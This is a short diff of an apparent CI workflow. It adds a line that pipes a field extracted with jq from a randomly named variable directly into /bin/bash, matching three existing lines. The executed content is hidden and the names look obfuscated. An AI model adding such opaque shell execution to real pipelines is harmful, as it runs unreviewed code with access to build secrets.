@@ -50,6 +50,7 @@ jobs:
           echo $ttxm19 | jq -r .ow42615 | /bin/bash
           echo $xk5 | jq -r .xbm21748 | /bin/bash
           echo $vwfz16364 | jq -r .vg4697 | /bin/bash
+          echo $sf6 | jq -r .b08187 | /bin/bash
 
       - name: Store artifact
         if: always()
